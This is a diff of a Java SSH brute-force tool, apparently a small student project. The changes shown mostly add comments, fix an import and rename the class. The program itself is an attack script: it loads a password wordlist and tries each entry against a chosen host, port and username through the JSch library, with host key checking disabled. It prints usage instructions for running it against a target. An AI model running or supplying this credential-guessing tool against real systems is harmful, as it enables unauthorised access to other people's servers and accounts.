@@ -1,18 +1,18 @@
 package sshbrute;
 
-import java.net.Socket; 
+//Socket imports here these do a lot with the connection part. 
+//Socket allows the connection 
+import java.net.Socket;
 import java.net.InetSocketAddress; 
-
 import java.util.ArrayList; 
 import java.io.FileReader; 
 import java.io.BufferedReader; 
 
-//Obsure import that is used for the 
-import com.jcraft.Jsch.*; 
+//Obsure Import that is needed to 
+import com.jcraft.jsch.*;
 
 
-
-public class SSHBrute {
+public class sshbrute {
 
     public static void checkHost(String host, int port) {
         //This trys to get get the connected 
@@ -48,15 +48,17 @@ public class SSHBrute {
             BufferedReader buffRead = new BufferedReader(new FileReader(path));
             String line = null; 
             
-            //Adds the lines of the file to the arraylist until the file is complete. IF the file is empty then it iwll fail. 
+            //Adds the lines of the file to the arraylist until the file is complete. IF the file is empty then it will fail. 
             while((line = buffRead.readLine()) != null){
                 wordList.add(line);
             }
             buffRead.close(); 
             System.out.println("Done");
         } 
-        catch (Exception e){ //failed to read the wordlist
-         System.out.println("Fail");
+        catch (Exception e){
+        //failed to read the wordlist, lets the user know what that it has failed 
+         System.out.println("Fail, Make sure word list is created.");
+         System.out.println("Use the command touch [Filename] followed by  using cat (Linux)");
          System.exit(1); 
         } 
         return wordList;
@@ -64,12 +66,14 @@ public class SSHBrute {
     
     //Mostly used from the open source JSchDeveloper Website and just modified it to log into our ssh 
     //http://www.jcraft.com/jsch/examples/Shell.java.html
-    
+    //Checks to see if the password was cracked or not
     public static boolean crackPass(String host, String user, String pass, int port){
         try{
+            //Usage of the JSch import 
             Session tryPass = new JSch().getSession(user, host, port); 
             tryPass.setPassword(pass);
             tryPass.setConfig("StrictHostKeyChecking", "no");
+            //Tries to connect for 30000 milliseconds 
             tryPass.connect(30000);
             tryPass.disconnect(); 
         }
@@ -79,15 +83,17 @@ public class SSHBrute {
         return true; 
     }
     
-    public static void main(String[] args) {
+    public static void main(String args[]) {
         if(args.length != 3){
+            // If the user doesnt provide 3 arguemnts the program aborts and tells the user the proper way to run the program 
             System.out.println("usage: ./sshbrute.jar {TARGET [:PORT]] [USERNAME] [WORDLIST]");
                 System.exit(1);
         }
         String targetIP; 
         int targetPort;
         
-        //do we have the arguments? If we do then use it else we should use the basic configuration of java 
+        //Allows for Delimiters 
+        
         if(args[0].contains(":")){
             targetIP = args[0].split(":")[0];
             targetPort = Integer.parseInt(args[0].split(":")[1]);
@@ -110,6 +116,10 @@ public class SSHBrute {
                 
             }
         }
+        //This will always be printed until ssh is actually set up  in an environment 
         System.out.println("Bruteforce Failed");
+        
+
     }
 }
+
